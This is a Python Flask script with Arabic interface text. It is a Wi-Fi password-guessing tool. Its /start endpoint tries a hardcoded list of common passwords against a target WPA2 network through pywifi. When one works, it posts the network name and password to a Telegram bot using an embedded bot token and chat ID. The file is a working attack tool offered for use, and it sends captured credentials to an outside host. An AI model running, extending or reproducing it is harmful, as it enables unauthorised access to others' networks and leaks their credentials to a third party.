from flask import Flask, request
import pywifi
from pywifi import const
import time
import requests
from telegram import Bot, ReplyKeyboardMarkup
import os

app = Flask(__name__)

TOKEN = "7831160199:AAGM0m3EJuy_JWssSZFY6WMjoxChnb48pfA"
CHAT_ID = "6969597735"

def send_telegram_message(text, use_buttons=False):
    if use_buttons:
        bot = Bot(token=TOKEN)
        keyboard = [
            ["📡 بدء التخمين", "📁 تحميل التقارير"],
            ["🛠 حالة الكرت", "💬 تواصل المطور"]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        bot.send_message(chat_id=CHAT_ID, text=text, reply_markup=reply_markup)
    else:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {
            "chat_id": CHAT_ID,
            "text": text
        }
        try:
            requests.post(url, data=data)
        except:
            print("⚠️ فشل إرسال الرسالة إلى تيليجرام")

def check_interface():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    if iface.status() in [const.IFACE_CONNECTED, const.IFACE_DISCONNECTED]:
        return iface
    else:
        raise Exception("❌ كرت الواي فاي غير جاهز")

def try_password(iface, ssid, password):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    temp_profile = iface.add_network_profile(profile)
    iface.connect(temp_profile)
    time.sleep(3)

    if iface.status() == const.IFACE_CONNECTED:
        iface.disconnect()
        return True
    iface.disconnect()
    return False

@app.route('/start', methods=['POST'])
def start_attack():
    data = request.get_json()
    ssid = data.get('ssid')
    password_list = ["12345678", "admin123", "password123", "mywifi2023", "qwerty123"]
    log = f"📡 بدء التخمين على الشبكة: {ssid}\n"

    try:
        iface = check_interface()
    except Exception as e:
        return str(e)

    for password in password_list:
        log += f"🔍 تجربة: {password}\n"
        if try_password(iface, ssid, password):
            result = f"🎯 تم الاتصال بالشبكة!\nSSID: {ssid}\nPassword: {password}"
            log += result + "\n"
            send_telegram_message(result)
            break
    else:
        log += "❌ لم يتم العثور على كلمة سر صحيحة."

    return log

if __name__ == '__main__':
    send_telegram_message("✅ تم تشغيل أداة فحص الشبكة بنجاح!\n📡 للتواصل: @vippmsl", use_buttons=True)
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
